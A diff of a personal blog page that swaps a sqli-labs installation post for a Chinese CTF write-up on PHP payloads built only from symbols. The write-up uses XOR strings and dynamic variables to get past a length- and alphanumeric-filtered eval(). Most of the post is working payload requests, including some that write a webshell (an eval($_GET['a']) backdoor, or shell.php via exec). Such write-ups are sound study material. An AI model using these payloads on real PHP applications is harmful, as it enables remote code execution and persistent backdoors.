@@ -3,20 +3,20 @@
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
-  <title>How to install sqli-labs on Windows 10 | 漏断&#39;s Blog</title>
+  <title>纯符号shell的学习 | 漏断&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="As a platform to help people learn SQL injection attack , sqli-labs provides challenges of 4 levels: basic challenges,advanced injections ,stacked injections and challenges ,which can be installed on">
-<meta name="keywords" content="environments">
+  <meta name="description" content="一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。 题目：12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(s">
+<meta name="keywords" content="PHP">
 <meta property="og:type" content="article">
-<meta property="og:title" content="How to install sqli-labs on Windows 10">
-<meta property="og:url" content="http://houwenda.github.io/2018/02/04/how-to-install-sqli-labs-on-windows-10/index.html">
+<meta property="og:title" content="纯符号shell的学习">
+<meta property="og:url" content="http://houwenda.github.io/2018/08/08/shell-made-of-symbols/index.html">
 <meta property="og:site_name" content="漏断&#39;s Blog">
-<meta property="og:description" content="As a platform to help people learn SQL injection attack , sqli-labs provides challenges of 4 levels: basic challenges,advanced injections ,stacked injections and challenges ,which can be installed on">
+<meta property="og:description" content="一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。 题目：12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(s">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-12-26T18:21:13.087Z">
+<meta property="og:updated_time" content="2018-12-26T18:16:26.474Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="How to install sqli-labs on Windows 10">
-<meta name="twitter:description" content="As a platform to help people learn SQL injection attack , sqli-labs provides challenges of 4 levels: basic challenges,advanced injections ,stacked injections and challenges ,which can be installed on">
+<meta name="twitter:title" content="纯符号shell的学习">
+<meta name="twitter:description" content="一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。 题目：12345678910111213141516&amp;lt;?phpinclude &apos;flag.php&apos;;if(isset($_GET[&apos;code&apos;]))&amp;#123;    $code = $_GET[&apos;code&apos;];    if(s">
   
     <link rel="alternative" href="/atom.xml" title="漏断&#39;s Blog" type="application/atom+xml">
   
@@ -226,11 +226,11 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-how-to-install-sqli-labs-on-windows-10" class="article article-type-post" itemscope="" itemprop="blogPost">
+      <div class="body-wrap"><article id="post-shell-made-of-symbols" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2018/02/04/how-to-install-sqli-labs-on-windows-10/" class="article-date">
-      <time datetime="2018-02-04T07:11:28.000Z" itemprop="datePublished">2018-02-04</time>
+      <a href="/2018/08/08/shell-made-of-symbols/" class="article-date">
+      <time datetime="2018-08-08T14:47:46.000Z" itemprop="datePublished">2018-08-08</time>
 </a>
     </div>
   
@@ -241,7 +241,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      How to install sqli-labs on Windows 10
+      纯符号shell的学习
     </h1>
   
 
@@ -256,7 +256,7 @@
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/environments/">environments</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -266,15 +266,52 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <p>As a platform to help people learn SQL injection attack , sqli-labs provides challenges of 4 levels: basic challenges,advanced injections ,stacked injections and challenges ,which can be installed on the basis of XAMPP ,here is how:<br><a id="more"></a></p>
-<ol>
-<li>Although I had installed XAMPP on my computer, the version of it is not supported due to a PHP function used in sqli-labs ,so i had to reinstall a XAMPP whose php version is 5.6.33.</li>
-<li>Download the compressed file from github:<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></li>
-<li>Unzip the file in htdocs folder</li>
-<li>Visit <a href="http://localhost/sqli-labs-master" target="_blank" rel="noopener">localhost/sqli-labs-master</a> using browser( remember to stop the proxy settings of Windows)</li>
-<li>Click Setup/reset database for labs ,if there’s no error shown on the page ,sqli-labs is successfully installed.</li>
-<li>Enjoy!</li>
-</ol>
+        <p>一道ctf题，看了其他大师傅的payload才搞懂了。后来试图绕过40字符写入webshell,走了一些弯路，最后只构造出一种37个字符的payload，记录一下。</p>
+<p>题目：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>题目考察PHP语言中的动态变量和可变函数、字符转化绕过</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">     202.112.51.184:20001/?code=$_=&quot;`&#123; &#123;&#123;:^&quot;?&lt;&gt;/&quot;;$$&#123;$_&#125;[_]();</span><br></pre></td></tr></table></figure></p>
+<p>服务器解析读取变量:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;]=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();</span><br><span class="line"></span><br><span class="line">$_GET[_]=getFlag</span><br></pre></td></tr></table></figure></p>
+<p>执行eval:</p>
+<p>字符串异或：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=_GET;</span><br></pre></td></tr></table></figure></p>
+<p>动态变量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$_&#125; == $_GET</span><br><span class="line"></span><br><span class="line">$&#123;$_&#125;[_] == $_GET[_]</span><br></pre></td></tr></table></figure>
+<p>GET开始时读取的变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[_] == getFlag</span><br><span class="line"></span><br><span class="line">$_GET[_]() ==getFlag();</span><br></pre></td></tr></table></figure></p>
+<p>另一种payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=(&quot;:&gt;/&#125;,!&apos;&quot;^&quot;][[;@@@&quot;);$_();</span><br></pre></td></tr></table></figure></p>
+<p>同样使用动态变量，只传入一个$_GET值</p>
+<p>构造接收POST：</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&quot;~~`~~&quot;^&quot;!./-*&quot;;$&#123;$_&#125;[_];</span><br><span class="line"></span><br><span class="line">POST：\_=readfile(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;] = $_=_POST;$&#123;$_&#125;[_];</span><br><span class="line"></span><br><span class="line">$_POST[_] = readfile(&apos;flag.php&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_ = _POST;</span><br><span class="line"></span><br><span class="line">$_POST[_];</span><br></pre></td></tr></table></figure></p>
+<p>尝试写入shell一：</p>
+<p>利用代码执行通过php函数写入文件</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__],$&#123;$_&#125;[___]);&amp;_=fwrite&amp;__=shell.php&amp;___=&lt;?php eval($_GET[&apos;a&apos;]);</span><br></pre></td></tr></table></figure></p>
+<p>48个字符,解决了PHP函数传参问题</p>
+<p>变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;] = $_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__],$&#123;$_&#125;[___]);</span><br><span class="line"></span><br><span class="line">$_GET[_] = fwrite</span><br><span class="line"></span><br><span class="line">$_GET[__] = shell.php</span><br><span class="line"></span><br><span class="line">$_GET[___] = &lt;?php eval($_GET[&apos;a&apos;]);</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_ = _GET;</span><br><span class="line"></span><br><span class="line">$_GET[_]($_GET[__],$_GET[___]);</span><br><span class="line"></span><br><span class="line">fwrite(&apos;shell.php&apos;,&apos;&lt;?php eval($_GET[&apos;a&apos;]);&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>尝试写入shell二：</p>
+<p>通过代码执行写入shell</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&apos;@)!@&apos;^&apos;%_@,&apos;;$__=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;($&#123;$__&#125;[_]);&amp;_=fwrite(&apos;shell.php&apos;,&apos;&lt;?phpeval($_GET[&apos;a&apos;]);&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>49个字符，避免了函数传参问题</p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval($_GET[_]);</span><br></pre></td></tr></table></figure></p>
+<p>这里遇到一个php问题:<br>与phpinfo()等不同，eval()在PHP中并不是作为一个函数而存在，通过可变函数调用eval()会返回undefined function eval()</p>
+<p><a href="https://stackoverflow.com/questions/29707896/undefined-function-eval-php" target="_blank" rel="noopener">“https://stackoverflow.com/questions/29707896/undefined-function-eval-php”</a></p>
+<p>尝试写入shell三：</p>
+<p>学长说可以构造命令执行，转换思路尝试一波。</p>
+<p>换一个PHP函数调用系统命令写入shell</p>
+<p>请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&apos;@#@@&apos;^&apos;%\[%#&apos;;$__=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;($&#123;$__&#125;[_]);&amp;_=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>49个字符</p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec($_GET[_]);</span><br></pre></td></tr></table></figure></p>
+<p>尝试写入shell四：</p>
+<p>意识到想要缩短code字符串，就得尽量通过code之外的$_GET变量传入参数，依照这个思路构造了出来</p>
+<p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=exec&amp;__=echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>37个字符，我所得到的最优解</p>
+<p>url编码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">202.112.51.184:20001/?code=$_=%22`&#123; &#123;&#123;%22^%22?%3C%3E/%22;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=exec&amp;__=echo%20%22%3C?php%20phpinfo();%20?%3E%22%3Eshell.php</span><br></pre></td></tr></table></figure></p>
+<p>变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_GET[&apos;code&apos;]= $_=&quot;`&#123; &#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;\[_]($&#123;$_&#125;[__]);</span><br><span class="line"></span><br><span class="line">$_GET[_] = exec</span><br><span class="line"></span><br><span class="line">$_GET[__] = echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php</span><br></pre></td></tr></table></figure></p>
+<p>执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$_=_GET;</span><br><span class="line"></span><br><span class="line">$_GET[_]($_GET[__]);</span><br><span class="line"></span><br><span class="line">exec(&apos;echo &quot;&lt;?php phpinfo(); ?&gt;&quot; &gt; shell.php&apos;);</span><br></pre></td></tr></table></figure></p>
+<p>梅子酒师傅部署题目时应该还做了二手准备，访问除题目外的页面都返回403，没能拿到shell，不过本地测试成功。</p>
+<p>在微信上看到有师傅连下划线都不用就实现了任意代码执行，发现自己跟师傅们的差距还是太大了，在此记录一下菜鸡对这道题的探究过程，作为备忘。</p>
+<p>参考：<br><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>
 
       
       
@@ -330,13 +367,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2018/02/04/how-to-install-sqli-labs-on-windows-10/">How to install sqli-labs on Windows 10</a></p>
+        <p><span>本文标题:</span><a href="/2018/08/08/shell-made-of-symbols/">纯符号shell的学习</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 漏断 的个人博客">漏断</a></p>
-        <p><span>发布时间:</span>2018年02月04日 - 15时11分</p>
-        <p><span>最后更新:</span>2018年12月27日 - 02时21分</p>
+        <p><span>发布时间:</span>2018年08月08日 - 22时47分</p>
+        <p><span>最后更新:</span>2018年12月27日 - 02时16分</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2018/02/04/how-to-install-sqli-labs-on-windows-10/" title="How to install sqli-labs on Windows 10">http://houwenda.github.io/2018/02/04/how-to-install-sqli-labs-on-windows-10/</a>
-            <span class="copy-path" data-clipboard-text="原文: http://houwenda.github.io/2018/02/04/how-to-install-sqli-labs-on-windows-10/　　作者: 漏断" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <span>原始链接:</span><a class="post-url" href="/2018/08/08/shell-made-of-symbols/" title="纯符号shell的学习">http://houwenda.github.io/2018/08/08/shell-made-of-symbols/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://houwenda.github.io/2018/08/08/shell-made-of-symbols/　　作者: 漏断" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
             <script src="/js/clipboard.min.js"></script>
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
@@ -349,18 +386,18 @@
 
 <nav id="article-nav">
   
-    <a href="/2018/02/06/php-e6-96-87-e4-bb-b6-e5-92-8c-e7-9b-ae-e5-bd-95-e7-ac-94-e8-ae-b0-e8-a1-a5-e5-85-85/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2018/12/21/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption"><</strong>
       <div class="article-nav-title">
         
-          PHP文件和目录 笔记补充
+          Hello World
         
       </div>
     </a>
   
   
-    <a href="/2018/02/02/xamppdvwa-on-windows-10-installation-guide/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">XAMPP+DVWA on Windows 10 installation guide</div>
+    <a href="/2018/03/20/nust-ctf-e5-b8-88-e5-82-85-e4-bb-ac-e7-9a-84blogs/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">师傅们的blogs</div>
       <strong class="article-nav-caption">></strong>
     </a>
   
@@ -416,17 +453,19 @@
 
 
 
+    
+
 
 
     <div class="scroll" id="post-nav-button">
         
-            <a href="/2018/02/06/php-e6-96-87-e4-bb-b6-e5-92-8c-e7-9b-ae-e5-bd-95-e7-ac-94-e8-ae-b0-e8-a1-a5-e5-85-85/" title="上一篇: PHP文件和目录 笔记补充">
+            <a href="/2018/12/21/hello-world/" title="上一篇: Hello World">
                 <i class="fa fa-angle-left"></i>
             </a>
         
         <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
         
-            <a href="/2018/02/02/xamppdvwa-on-windows-10-installation-guide/" title="下一篇: XAMPP+DVWA on Windows 10 installation guide">
+            <a href="/2018/03/20/nust-ctf-e5-b8-88-e5-82-85-e4-bb-ac-e7-9a-84blogs/" title="下一篇: 师傅们的blogs">
                 <i class="fa fa-angle-right"></i>
             </a>
         
